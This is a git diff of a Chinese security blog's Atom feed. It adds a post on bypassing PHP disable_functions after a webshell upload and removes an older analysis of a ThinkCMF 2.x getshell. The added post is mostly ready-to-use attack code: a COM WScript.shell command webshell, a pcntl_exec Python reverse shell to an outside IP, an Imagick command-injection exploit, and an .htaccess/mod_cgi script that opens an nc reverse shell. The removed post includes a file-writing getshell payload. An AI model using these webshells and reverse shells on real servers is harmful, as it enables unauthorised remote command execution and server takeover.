@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://chriskalix.github.io</id>
     <title>chriskali&apos;s blog</title>
-    <updated>2020-07-19T13:32:16.026Z</updated>
+    <updated>2020-07-26T10:23:05.882Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://chriskalix.github.io"/>
     <link rel="self" href="https://chriskalix.github.io/atom.xml"/>
@@ -10,6 +10,189 @@
     <logo>https://chriskalix.github.io/images/avatar.png</logo>
     <icon>https://chriskalix.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, chriskali&apos;s blog</rights>
+    <entry>
+        <title type="html"><![CDATA[disable_functions bypass整理]]></title>
+        <id>https://chriskalix.github.io/post/GqcqeDkXU/</id>
+        <link href="https://chriskalix.github.io/post/GqcqeDkXU/">
+        </link>
+        <updated>2020-07-26T10:22:04.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>disable_function，通常在上传了webshell后让人头疼的问题。之前做过绕过，不过没有系统的整理复现过。话题比较老了，做个回顾纪念，大部分为搬运</p>
+</blockquote>
+<h2 id="环境">环境</h2>
+<p>phpstudy<br>
+php 7.1.9</p>
+<p>开始前需要手动添加<code>disable_functions</code>，我配置的为 <code>exec,system,passthru,popen,pclose,shell_exec,proc_open,dl,curl_exec,multi_exec,chmod,gzinflate,set_time_limit</code></p>
+<h2 id="绕过整理">绕过整理</h2>
+<h3 id="0x01-windows-系统组件">0x01 Windows - 系统组件</h3>
+<blockquote>
+<p>适用于Windows下，使用前需要查看COM组件是否开启。windows下5.X默认支持</p>
+</blockquote>
+<p>在 <code>php.ini</code> 中找到 <code>extension=php_com_dotnet.dll</code> 并且开启（若没有则直接添加），结果如下<br>
+<img src="https://chriskalix.github.io/post-images/1595758966523.png" alt="" loading="lazy"></p>
+<p>对于com组件仅简单了解，不做搬运文章的苦力，<a href="https://www.zhihu.com/question/49433640">文章地址</a>。从百度百科抄一句：COM是开发软件组件的一种方法。组件实际上是一些小的二进制可执行程序，它们可以给应用程序，操作系统以及其他组件提供服务。<br>
+通过COM组件，调用WScript.shell（这个在写VBS的时候经常用到）或者shell.application执行系统命令。从安全客上搬运的代码如下：</p>
+<pre><code class="language-php">&lt;?php
+$wsh = isset($_GET['wsh']) ? $_GET['wsh'] : 'wscript';
+if($wsh == 'wscript') {
+    $command = $_GET['cmd'];
+    $wshit = new COM('WScript.shell') or die(&quot;Create Wscript.Shell Failed!&quot;);
+    $exec = $wshit-&gt;exec(&quot;cmd /c&quot;.$command);
+    $stdout = $exec-&gt;StdOut();
+    $stroutput = $stdout-&gt;ReadAll();
+    echo $stroutput;
+}
+elseif($wsh == 'application') {
+    $command = $_GET['cmd'];
+    $wshit = new COM(&quot;Shell.Application&quot;) or die(&quot;Shell.Application Failed!&quot;);
+    $exec = $wshit-&gt;ShellExecute(&quot;cmd&quot;,&quot;/c &quot;.$command);
+} 
+else {
+  echo(0);
+}
+?&gt;
+</code></pre>
+<p>执行效果如下</p>
+<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1595758973366.png" alt="" loading="lazy"></figure>
+<h3 id="0x02-linux-ld_preload">0x02 Linux - LD_PRELOAD</h3>
+<blockquote>
+<p>条件：1. 能上传.so文件 2. putenv能使用，控制环境变量 3. mail, imap_mail, mb_send_mail, error_log等函数能够调用</p>
+</blockquote>
+<p>相比起来，这个稍微熟悉一点。之前在写Linux下应急响应脚本的时候，就包含LD_PRELOAD的检验。LD_PRELOAD是linux下的预加载环境变量，可以通过导入恶意的.so文件替换环境变量，从而劫持函数。在安全客上有一篇<a href="https://www.anquanke.com/post/id/175403">深入浅出LD_PRELOAD&amp;putenv()</a>。为什么要使用mail之类的函数？因为在设置环境变量后，仅会在请求期间存在，想要使预环境变量被加载，就要找到创建子进程的函数，从而触发恶意.so文件。同样的摸到了仓库<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">github - LD_PRELOAD</a>，讲的也很好，在理解的情况下做一点搬运<br>
+通常情况下，大部分文章使用LD_PRELOAD的方法为如下几步：</p>
+<ol>
+<li>编写一个getuid的C函数（为什么是getuid，因为sendmail会用到），编译成xx.so</li>
+<li>运行phpenv，设置LD_PRELOAD为xx.so</li>
+<li>运行mail函数，由于设置了LD_PRELOAD，会优先从xx.so中寻找函数</li>
+<li>执行恶意命令</li>
+</ol>
+<p>但是在实战用会碰到一系列问题，如禁止sendmail，服务器上根本没有安装sendmail。仓库中提到，不要局限于劫持某一个函数，而应考虑<strong>拦截启动进程</strong>。在GCC中有一个C语言的拓展修饰符， <code>__attribute__((constructor))</code> ，可以让由它修饰的函数在<code>main()</code> 函数之前运行。当出现在共享对象中，一旦对象被系统加载，则立即执行由它所修饰的函数。而当启动新进程的时候，又会自动调用该函数，会造成循环阻塞。这里需要注意的是，由于需要调用 <code>unsetenv()</code> ，在centos下是不可行的（具体原因看仓库）。<br>
+在知道原理后直接使用作者的仓库进行尝试：<br>
+<img src="https://chriskalix.github.io/post-images/1595758980470.png" alt="" loading="lazy"></p>
+<p>这里作者提到一个问题，如果目标开启SELinux会导致对outpath没有读写权限，以及.so文件是在debian系统下编译，对于非debian系统需要重新编译。</p>
+<h3 id="0x03-linux-pcntl_exec">0x03 Linux - pcntl_exec</h3>
+<blockquote>
+<p>这个也很早了，文章很多，主要是做个记录</p>
+</blockquote>
+<p>该函数在PHP&gt;4.2.0，5，7中存在。搬运一个python的版本，可以自行修改</p>
+<pre><code class="language-php">&lt;?php
+pcntl_exec(&quot;/usr/bin/python&quot;,array('-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'));?&gt;
+</code></pre>
+<h3 id="0x04-imagick">0x04 imagick</h3>
+<blockquote>
+<p>这个每个文章里基本都有，做个记录吧</p>
+</blockquote>
+<p>还是一样，先在 <code>phpinfo</code> 中先看下是否有该组件。这个在看H1文章会看到，属于组件问题。直接搬运一下RicterZ师傅的代码，url自行更改（不过感觉现在基本没了吧...）</p>
+<pre><code class="language-php"># Exploit Title: PHP Imagick disable_functions Bypass
+# Date: 2016-05-04
+# Exploit Author: RicterZ (ricter@chaitin.com)
+# Vendor Homepage: https://pecl.php.net/package/imagick
+# Version: Imagick  &lt;= 3.3.0 PHP &gt;= 5.4
+# Test on: Ubuntu 12.04
+ 
+# Exploit:
+ 
+&lt;?php
+# PHP Imagick disable_functions Bypass
+# Author: Ricter &lt;ricter@chaitin.com&gt;
+#
+# $ curl &quot;127.0.0.1:8080/exploit.php?cmd=cat%20/etc/passwd&quot;
+# &lt;pre&gt;
+# Disable functions: exec,passthru,shell_exec,system,popen
+# Run command: cat /etc/passwd
+# ====================
+# root:x:0:0:root:/root:/usr/local/bin/fish
+# daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+# bin:x:2:2:bin:/bin:/bin/sh
+# sys:x:3:3:sys:/dev:/bin/sh
+# sync:x:4:65534:sync:/bin:/bin/sync
+# games:x:5:60:games:/usr/games:/bin/sh
+# ...
+# &lt;/pre&gt;
+echo &quot;Disable functions: &quot; . ini_get(&quot;disable_functions&quot;) . &quot;\n&quot;;
+$command = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';
+echo &quot;Run command: $command\n====================\n&quot;;
+ 
+$data_file = tempnam('/tmp', 'img');
+$imagick_file = tempnam('/tmp', 'img');
+ 
+$exploit = &lt;&lt;&lt;EOF
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/image.jpg&quot;|$command&gt;$data_file&quot;)'
+pop graphic-context
+EOF;
+ 
+file_put_contents(&quot;$imagick_file&quot;, $exploit);
+$thumb = new Imagick();
+$thumb-&gt;readImage(&quot;$imagick_file&quot;);
+$thumb-&gt;writeImage(tempnam('/tmp', 'img'));
+$thumb-&gt;clear();
+$thumb-&gt;destroy();
+ 
+echo file_get_contents($data_file);
+?&gt;
+</code></pre>
+<h3 id="0x05-htaccess">0x05 .htaccess</h3>
+<blockquote>
+<p>.htaccess，做配置的时候老见到了，也有用来做后门隐藏的，总之用法很多</p>
+</blockquote>
+<p>（搬运一下）有如下条件：</p>
+<ol>
+<li>必须是apache</li>
+<li>mod_cgi</li>
+<li>运行.htaccess生效</li>
+<li>有写.htaccess的权限</li>
+</ol>
+<pre><code class="language-php">&lt;?php
+$cmd = &quot;nc -c'/bin/bash' 127.0.0.1 4444&quot;; //反弹一个shell出来，这里用本地的4444端口
+$shellfile =&quot;#!/bin/bash\n&quot;; //指定shell
+$shellfile .=&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //需要指定这个header，否则会返回500
+$shellfile .=&quot;$cmd&quot;; 
+functioncheckEnabled($text,$condition,$yes,$no) //this surely can be shorter
+{
+    echo &quot;$text: &quot; . ($condition ?$yes : $no) . &quot;&lt;br&gt;\n&quot;;
+}
+if(!isset($_GET['checked']))
+{
+    @file_put_contents('.htaccess',&quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); 
+    header('Location: ' . $_SERVER['PHP_SELF']. '?checked=true'); //执行环境的检查
+}
+else
+{
+    $modcgi = in_array('mod_cgi',apache_get_modules()); // 检测mod_cgi是否开启
+    $writable = is_writable('.'); //检测当前目录是否可写
+    $htaccess = !empty($_SERVER['HTACCESS']);//检测是否启用了.htaccess
+        checkEnabled(&quot;Mod-Cgienabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);
+        checkEnabled(&quot;Iswritable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);
+        checkEnabled(&quot;htaccessworking&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);
+    if(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))
+    {
+        echo &quot;Error. All of the above mustbe true for the script to work!&quot;; //必须满足所有条件
+    }
+    else
+    {
+       
+ checkEnabled(&quot;Backing 
+up.htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded!Saved in 
+.htaccess.bak&quot;,&quot;Failed!&quot;); //备份一下原有.htaccess
+        
+checkEnabled(&quot;Write 
+.htaccessfile&quot;,file_put_contents('.htaccess',&quot;Options 
++ExecCGI\nAddHandlercgi-script 
+.dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//.dizzle，我们的特定扩展名
+        checkEnabled(&quot;Write shellfile&quot;,file_put_contents('shell.dizzle',$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//写入文件
+        checkEnabled(&quot;Chmod777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//给权限
+        echo &quot;Executing the script now.Check your listener &lt;img src = 'shell.dizzle' style ='display:none;'&gt;&quot;; //调用
+    }
+}
+?&gt;
+</code></pre>
+<h2 id="参考">参考</h2>
+<p><a href="https://xz.aliyun.com/t/5320#toc-0">先知文章</a><br>
+<a href="https://baijiahao.baidu.com/s?id=1659386031704746677&amp;wfr=spider&amp;for=pc">E安全</a></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[域渗透整理复现]]></title>
         <id>https://chriskalix.github.io/post/2cLB43Y5A/</id>
@@ -1587,176 +1770,6 @@ POST: list=/script/../../../config/database.php
 </code></pre>
 <p>作者提到了两种方法，一为上传图片马再通过<code>include()</code>函数包含，第二就是下面提到的简单一些的通用方法。<br>
 跟着代码读一下，其实就是将传入的模板进行过滤，过滤掉特殊字符串。在我整理的PHP后门那个文章中提到了这个的绕过方法。这里的具体应用即为使用<code>chr%01(xxx)</code>这种形式(即函数+控制字符+参数)的形式绕过。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Thinkcmf 2.x Getshell分析]]></title>
-        <id>https://chriskalix.github.io/post/thinkcmf-2x-getshell-fen-xi/</id>
-        <link href="https://chriskalix.github.io/post/thinkcmf-2x-getshell-fen-xi/">
-        </link>
-        <updated>2020-06-14T04:40:08.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="环境">环境</h2>
-<p>windows<br>
-phpstudy (php7.2.9)<br>
-thinkcmf 2.2.2</p>
-<h2 id="具体分析">具体分析</h2>
-<p>首先在<code>index.php</code>中定义了项目路径为<code>application/</code><br>
-在入口点控制器<code>application/Portal/Controller/IndexController.class.php</code>中只定义了一个index函数，但是因为继承了<code>HomebaseController</code>类，可以调用<code>HomebaseController</code>中属性为public的函数<br>
-跟进<code>application/Common/Controller/HomebaseController.class.php</code>，其中需要关注的是两个函数，分别为display以及fetch</p>
-<h3 id="getshell方法1">Getshell方法1</h3>
-<p>通过display方法getshell</p>
-<pre><code class="language-php">/**
-    * 加载模板和页面输出 可以返回输出内容
-    * @access public
-    * @param string $templateFile 模板文件名
-    * @param string $charset 模板输出字符集
-    * @param string $contentType 输出类型
-    * @param string $content 模板输出内容
-    * @return mixed
-    */
-public function display($templateFile = '', $charset = '', $contentType = '', $content = '', $prefix = '') {
-    parent::display($this-&gt;parseTemplate($templateFile), $charset, $contentType,$content,$prefix);
-}
-</code></pre>
-<p><code>display</code>函数的注释中也提及了，用于加载模板和页面输出，这里存在的是任意文件包含漏洞。<br>
-这里使用a参数指定方法，传入<code>templateFile</code>参数可直接完成本地包含，本地测试payload为<code>?a=display&amp;templateFile=README.md</code><br>
-那么如何Getshell呢？Sp4ce师傅的<a href="https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw">文章</a>中使用的是通过报错的方法，将shell写入当天的日志，然后通过包含日志执行写入shell，然后连接shell即可</p>
-<p>这边讲的稍微浅一点，在Getshell方法2中补全</p>
-<h3 id="getshell方法2">Getshell方法2</h3>
-<p>通过fetch方法</p>
-<pre><code class="language-php">/**
-    * 获取输出页面内容
-    * 调用内置的模板引擎fetch方法，
-    * @access protected
-    * @param string $templateFile 指定要调用的模板文件
-    * 默认为空 由系统自动定位模板文件
-    * @param string $content 模板输出内容
-    * @param string $prefix 模板缓存前缀*
-    * @return string
-    */
-public function fetch($templateFile='',$content='',$prefix=''){
-    $templateFile = empty($content)?$this-&gt;parseTemplate($templateFile):'';
-    return parent::fetch($templateFile,$content,$prefix);
-}
-</code></pre>
-<h4 id="深入查看">深入查看</h4>
-<p>大多数的文章一般就是引用一下<code>payload</code>手动复现，之前我也没有看过thinkcmf这个框架，只是看别人文章里说的，是基于<code>thinkphp3.x</code>封装的，决定静态的去跟踪一下，深入理解。<br>
-<code>parent::fetch</code>调用父类的fetch，看下函数定义<code>class HomebaseController extends AppframeController</code>，在<code>AppframeController</code>下并无fetch方法，继续查看，发现就是调用了Think模块下的Controller</p>
-<pre><code class="language-php">namespace Common\Controller;
-use Think\Controller;
-class AppframeController extends Controller
-</code></pre>
-<p>所以fetch函数本质上就是从Thinkphp的Controller中抽象出来，没有其他区别。继续跟进<code>simplewind/Core/Library/Think/Controller.class.php</code>，函数如下</p>
-<pre><code class="language-php">protected function fetch($templateFile='',$content='',$prefix='') {
-    return $this-&gt;view-&gt;fetch($templateFile,$content,$prefix);
-}
-</code></pre>
-<p>调用了view下的fetch，找到在<code>__construct()</code>中被初始化</p>
-<pre><code class="language-php">public function __construct() {
-    Hook::listen('action_begin',$this-&gt;config);
-    //实例化视图类
-    $this-&gt;view     = Think::instance('Think\View');
-    //控制器初始化
-    if(method_exists($this,'_initialize'))
-        $this-&gt;_initialize();
-}
-</code></pre>
-<p>继续跟进，为<code>simplewind/Core/Library/Think/View.class.php</code>，第106行找到fetch函数，如下所示</p>
-<pre><code class="language-php">public function fetch($templateFile='',$content='',$prefix='') {
-    if(empty($content)) {
-        $templateFile   =   $this-&gt;parseTemplate($templateFile);
-        // 模板文件不存在直接返回
-        if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
-    }else{
-        defined('THEME_PATH') or    define('THEME_PATH', $this-&gt;getThemePath());
-    }
-    // 页面缓存
-    ob_start();
-    ob_implicit_flush(0);
-    if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // 使用PHP原生模板
-        $_content   =   $content;
-        // 模板阵列变量分解成为独立变量
-        extract($this-&gt;tVar, EXTR_OVERWRITE);
-        // 直接载入PHP模板
-        empty($_content)?include $templateFile:eval('?&gt;'.$_content);
-    }else{
-        // 视图解析标签
-        $params = array('var'=&gt;$this-&gt;tVar,'file'=&gt;$templateFile,'content'=&gt;$content,'prefix'=&gt;$prefix);
-        Hook::listen('view_parse',$params);
-    }
-    // 获取并清空缓存
-    $content = ob_get_clean();
-    // 内容过滤标签
-    Hook::listen('view_filter',$content);
-    // 输出模板文件
-    return $content;
-}
-</code></pre>
-<p><code>Getshell方法1</code>的函数也在这个文件下。找到真正的fetch函数，分析一下。<br>
-这里有一些函数是thinkphp中自带的几个较为重要的函数，如fetch函数中的E，L，C。翻阅了一下资料，做一个简单补充。<br>
-C方法：简单的理解为Config，即是用于设置、获取、以及保存配置参数的方法。其中的C('TMPL_ENGINE_TYPE')即为获取配置值<br>
-E方法：即为Error，具体就为throw new Think\Exception($msg, $code);<br>
-L方法：代表Language，用于获得语言变量</p>
-<p>回到fetch函数继续进行分析。fetch函数下较为简单，只是两个if语句判断。</p>
-<p>第一个if语句判断是否传入<code>$content</code>参数。第二处判断<code>strtolower(C('TMPL_ENGINE_TYPE'))</code>，下断点调试后得到<code>strtolower(C('TMPL_ENGINE_TYPE'))</code>的值为think，走到else分支。不太了解的是Hook::listen，故去检索。文章中提到，<code>Hook::listen</code>通过遍历某个行为标签的所有行为，依次实例化并且调用run方法。找到最終将<code>$param</code>参数传入<code>simplewind/Core/Library/Behavior/ParseTemplateBehavior.class.php</code>，找到其中run方法，如下所示：</p>
-<pre><code class="language-php">public function run(&amp;$_data){
-    $engine             =   strtolower(C('TMPL_ENGINE_TYPE'));
-    $_content           =   empty($_data['content'])?$_data['file']:$_data['content'];
-    $_data['prefix']    =   !empty($_data['prefix'])?$_data['prefix']:C('TMPL_CACHE_PREFIX');
-    if('think'==$engine){ // 采用Think模板引擎
-        if((!empty($_data['content']) &amp;&amp; $this-&gt;checkContentCache($_data['content'],$_data['prefix'])) 
-            ||  $this-&gt;checkCache($_data['file'],$_data['prefix'])) { // 缓存有效
-            //载入模版缓存文件
-            Storage::load(C('CACHE_PATH').$_data['prefix'].md5($_content).C('TMPL_CACHFILE_SUFFIX'),$_data['var']);
-        }else{
-            $tpl = Think::instance('Think\\Template');
-            // 编译并加载模板文件
-            $tpl-&gt;fetch($_content,$_data['var'],$_data['prefix']);
-        }
-    }else{
-        // 调用第三方模板引擎解析和输出
-        if(strpos($engine,'\\')){
-            $class  =   $engine;
-        }else{
-            $class   =  'Think\\Template\\Driver\\'.ucwords($engine);
-        }
-        if(class_exists($class)) {
-            $tpl   =  new $class;
-            $tpl-&gt;fetch($_content,$_data['var']);
-        }else {  // 类没有定义
-            E(L('_NOT_SUPPORT_').': ' . $class);
-        }
-    }
-}
-</code></pre>
-<p>即是一个嵌套判断。首先<code>$engine</code>为think，走进第一层if判断中。<code>$_data['content']</code>不为empty，<code>$this-&gt;checkContentCache</code>为False，<code>$this-&gt;checkCache</code>也为false，走到else分支。(这边就不再详细跟进具体函数，不然太长了)。之后执行两个操作，<code>Think::instance('Think\\Template')以及$tpl-&gt;fetch($_content,$_data['var'],$_data['prefix'])</code>。</p>
-<p>跟进fetch，具体为</p>
-<pre><code class="language-php">public function fetch($templateFile,$templateVar,$prefix='') {
-    $this-&gt;tVar         =   $templateVar;
-    $templateCacheFile  =   $this-&gt;loadTemplate($templateFile,$prefix);
-    Storage::load($templateCacheFile,$this-&gt;tVar,null,'tpl');
-}
-</code></pre>
-<p>在<code>$this-&gt;loadTemplate</code>的时候写入了缓存模板文件。</p>
-<p>调用<code>Storage::load</code>，如下</p>
-<pre><code class="language-php">public function load($_filename,$vars=null){
-    if(!is_null($vars)){
-        extract($vars, EXTR_OVERWRITE);
-    }
-    include $_filename;
-}
-</code></pre>
-<p>再通过include包含进来，执行php代码。以上都是跟着文章中的payload一步步调试跟进。其实到thinkcmf抽象的fetch之后的，都算是Thinkphp的问题吧...</p>
-<h4 id="payload">payload</h4>
-<p>在index路径下写入<code>phpinfo()</code>的payload为</p>
-<pre><code class="language-txt">?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php&gt;file_put_contents('test.php','&lt;?php phpinfo(); ?&gt;')&lt;/php&gt;
-</code></pre>
-<h2 id="知识点困惑点">知识点&amp;困惑点</h2>
-<p>很多文章中都提及到了thinkphp中的g\m\a，即分组\控制器\方法。文中提及到的方法均为通过直接使用方法去调用父类的public函数。困惑的地方为官方文档中提及到的，也有m\c\a这个概念，即module\controller\application(总觉得好像是一样的，暂时先埋个坑，后续我再去翻阅文档)</p>
-<h2 id="修复">修复</h2>
-<p>将display和fetch两个函数都改为protected</p>
-<h2 id="参考文章">参考文章</h2>
-<p><a href="https://xz.aliyun.com/t/6626#toc-5">先知文章</a></p>
 ]]></content>
     </entry>
 </feed>
